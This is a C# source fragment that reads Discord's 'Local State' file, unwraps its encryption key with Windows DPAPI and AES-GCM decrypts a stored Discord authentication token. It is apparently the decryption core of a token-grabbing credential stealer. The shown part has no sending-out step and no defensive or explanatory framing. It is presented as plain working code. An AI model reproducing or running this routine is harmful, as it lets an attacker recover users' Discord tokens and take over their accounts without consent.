        static byte[] DecryptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion
    }
}
